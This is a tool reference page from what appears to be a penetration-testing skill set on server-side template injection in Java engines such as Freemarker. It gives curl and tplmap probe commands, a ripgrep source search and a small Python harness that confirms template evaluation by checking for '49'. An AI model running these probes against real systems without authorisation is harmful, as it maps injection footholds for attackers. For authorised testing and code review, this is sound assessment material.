# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ssti-java-template-engines`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/greet?name=%3C%23assign%20zz%3D7*7%3E%24%7Bzz%7D'` | Send a Freemarker assignment probe and read whether 49 is rendered | Cross-platform |
| `tplmap` | `tplmap -u 'https://target.example/greet?name=probe' --engine Freemarker` | Fingerprint and confirm a specific Java engine with arithmetic probes | Linux, macOS |
| `ripgrep` | `rg -n -e "new Template(" -e SpelExpressionParser -e "new VelocityContext" --type java` | Locate Java template or SpEL construction that may consume request data | Cross-platform |

## Minimal Script Shape

A Java-engine harness: it sends a Freemarker assignment probe and a neutralised control, confirming evaluation only when the product appears for the probe but not the control.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/greet"

def render(name_value):
    url = BASE + "?" + urllib.parse.urlencode({"name": name_value})
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read().decode("utf-8", "replace")

freemarker = render("<#assign zz=7*7>${zz}")
control = render("${'7*7'}")
print({"freemarker_evaluated": "49" in freemarker,
       "control_literal": "49" not in control,
       "java_ssti_confirmed": "49" in freemarker and "49" not in control})
```
